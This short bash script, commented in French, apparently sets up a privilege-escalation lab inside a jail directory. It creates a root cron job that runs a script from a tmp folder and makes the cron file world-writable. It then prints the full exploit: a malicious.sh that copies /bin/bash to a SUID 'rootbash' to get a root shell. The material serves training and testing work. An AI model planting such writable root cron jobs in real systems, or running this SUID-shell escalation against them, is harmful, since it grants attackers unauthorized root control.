#!/bin/bash
# Création d'une tâche cron modifiable

mkdir -p /home/jailed/etc/cron.d/
echo "* * * * * root /home/jailed/tmp/malicious.sh" > /home/jailed/etc/cron.d/vuln_cron
chmod 777 /home/jailed/etc/cron.d/vuln_cron

echo "✅ Cron vulnérable. Exploitation :
echo '#!/bin/bash' > /home/jailed/tmp/malicious.sh
echo 'cp /bin/bash /home/jailed/tmp/rootbash && chmod 4755 /home/jailed/tmp/rootbash' >> /home/jailed/tmp/malicious.sh
chmod +x /home/jailed/tmp/malicious.sh"
